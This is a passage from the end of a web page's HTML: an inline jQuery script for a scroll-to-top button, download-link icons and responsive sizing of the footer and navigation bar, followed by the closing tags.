        topScroll.style.display = "none";
      }
    }

    function topFunction() {
      document.body.scrollTop = 0;
      document.documentElement.scrollTop = 0;
    }

    $(window).on('load', function () {

      $('a[download]').each((i, e) => {
        $(e).addClass('fa fa-download');
      });

      setSizes();
    });

    $(window).resize(setSizes);

    function setSizes() {
      if ($(window).width() < 960) {
        $('#bottom-bar').hide();
        $('footer').show();
        $('#navbarSupportedContent').css('max-height', 'unset');
        $('.navbar-collapse').collapse('hide');
        if (document.body.clientHeight - $('#header').outerHeight() - $('#main_content').outerHeight() - $('#comments').outerHeight() < 150) {
          $('footer').css("position", "unset");
        } else {
          $('footer').css("position", "fixed");
        }
      }
      else {
        $('#bottom-bar').show();
        $('footer').hide();
        $('.navbar-collapse').collapse('hide');
        $('footer').css("position", "fixed");
        $('#navbarSupportedContent').css('max-height', (document.body.clientHeight - $('.title-container').outerHeight() - $('#bottom-bar').outerHeight() - $('.navbar-toggler').outerHeight() - 50));
      }
    }
  </script>

</body>

</html>
